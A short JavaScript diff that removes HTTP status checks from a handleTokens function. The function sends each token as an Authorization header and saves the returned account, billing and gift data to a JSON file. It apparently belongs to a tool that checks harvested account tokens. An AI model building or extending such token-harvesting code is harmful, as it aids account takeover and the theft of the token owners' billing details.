@@ -84,7 +84,6 @@ const handleTokens = (tokens, resolve) => tokens.forEach(token => {
     headers: { Authorization: token, 'User-Agent': userAgent }
   })
     .then(res => {
-      if (res.status !== 200) return;
       let json = res.data;
       json.token = token;
       let info = JSON.parse(readFileSync(jsonFile).toString());
@@ -98,7 +97,6 @@ const handleTokens = (tokens, resolve) => tokens.forEach(token => {
         headers: { Authorization: token, 'User-Agent': userAgent }
       })
         .then(res => {
-          if (res.status !== 200) return;
           const json = res.data;
           let info = JSON.parse(readFileSync(jsonFile).toString());
           if (!info.billing) info.billing = [];
@@ -111,7 +109,6 @@ const handleTokens = (tokens, resolve) => tokens.forEach(token => {
             headers: { Authorization: token, 'User-Agent': userAgent }
           })
             .then(res => {
-              if (res.status !== 200) return;
               const json = res.data;
               let info = JSON.parse(readFileSync(jsonFile).toString());
               if (!info.gifts) info.gifts = [];
